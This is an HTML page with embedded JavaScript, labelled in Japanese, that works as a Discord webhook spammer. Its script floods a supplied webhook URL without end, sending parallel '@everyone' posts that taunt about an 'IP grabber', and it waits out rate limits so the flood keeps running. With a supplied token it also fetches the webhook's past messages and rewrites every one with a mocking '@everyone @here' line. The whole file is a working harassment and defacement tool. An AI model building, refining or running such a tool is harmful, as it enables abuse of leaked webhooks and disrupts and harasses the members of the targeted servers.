<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>Parallel Webhook Spammer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background: #1e1e1e;
      color: #fff;
      font-family: monospace;
      padding: 20px;
    }
    .card {
      background: #2c2f33;
      padding: 20px;
      border-radius: 10px;
      max-width: 600px;
      margin: auto;
    }
    label, input, textarea, button {
      width: 100%;
      display: block;
      margin-top: 12px;
      font-size: 14px;
    }
    textarea {
      height: 60px;
    }
    #log {
      margin-top: 20px;
      white-space: pre-wrap;
      background: #111;
      padding: 10px;
      border-radius: 6px;
      height: 200px;
      overflow-y: auto;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Webhook Spammer (Parallel)</h2>
    <label>Webhook URL</label>
    <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." />

    <label>トークン（任意。過去投稿編集）</label>
    <input type="text" id="token" placeholder="MTAx..." />

    <label>並列数（同時送信数）</label>
    <input type="number" id="threads" placeholder="例: 10" value="5" />

    <button onclick="start()">実行</button>
    <div id="log"></div>
  </div>

  <script>
    const log = (msg) => {
      const el = document.getElementById("log");
      el.textContent += msg + "\n";
      el.scrollTop = el.scrollHeight;
    };

    const sleep = (ms) => new Promise(r => setTimeout(r, ms));

    async function sendOne(webhook, msg) {
      try {
        const res = await fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: msg })
        });

        if (res.status === 204 || res.status === 200) {
          log("[✓] Sent");
        } else if (res.status === 429) {
          const json = await res.json();
          log("[!] Ratelimit " + json.retry_after + "ms");
          await sleep(json.retry_after);
        } else if (res.status === 401 || res.status === 403) {
          log("[×] Webhook無効。停止");
          throw new Error("forbidden");
        } else {
          log("[?] Status " + res.status);
        }
      } catch (e) {
        log("[ERR] " + e.message);
      }
    }

    async function parallelSpam(webhook, threadCount) {
      const message = "@everyone IPグラバーwwwww";

      while (true) {
        const promises = [];
        for (let i = 0; i < threadCount; i++) {
          promises.push(sendOne(webhook, message));
        }

        await Promise.all(promises); // 同時送信
        await sleep(1000); // 1秒ごとに発射（調整して）
      }
    }

    async function editOldMessages(webhook, token) {
      const listUrl = webhook + "/messages";
      try {
        const res = await fetch(listUrl, {
          headers: { Authorization: token }
        });
        if (!res.ok) return log("[×] 過去メッセージ取得失敗: " + res.status);

        const msgs = await res.json();
        for (const msg of msgs) {
          const editRes = await fetch(`${webhook}/messages/${msg.id}`, {
            method: "PATCH",
            headers: {
              Authorization: token,
              "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: "@everyone @here AI診断サイト（笑）" })
          });

          if (editRes.status === 429) {
            const json = await editRes.json();
            log("[!] 編集Ratelimit " + json.retry_after + "ms");
            await sleep(json.retry_after);
          } else if (editRes.ok) {
            log("[✓] 編集: " + msg.id);
          } else {
            log("[×] 編集失敗: " + msg.id + " / " + editRes.status);
          }

          await sleep(1000);
        }
      } catch (err) {
        log("[ERROR] 編集中エラー: " + err.message);
      }
    }

    async function start() {
      const webhook = document.getElementById("webhook").value.trim();
      const token = document.getElementById("token").value.trim();
      const threads = parseInt(document.getElementById("threads").value.trim()) || 5;

      if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
        log("[×] URLが不正");
        return;
      }

      if (token) {
        log("[i] 過去メッセージ編集開始");
        await editOldMessages(webhook, token);
      }

      log(">> 並列スパム開始！ Threads: " + threads);
      await parallelSpam(webhook, threads);
    }
  </script>
</body>
</html>
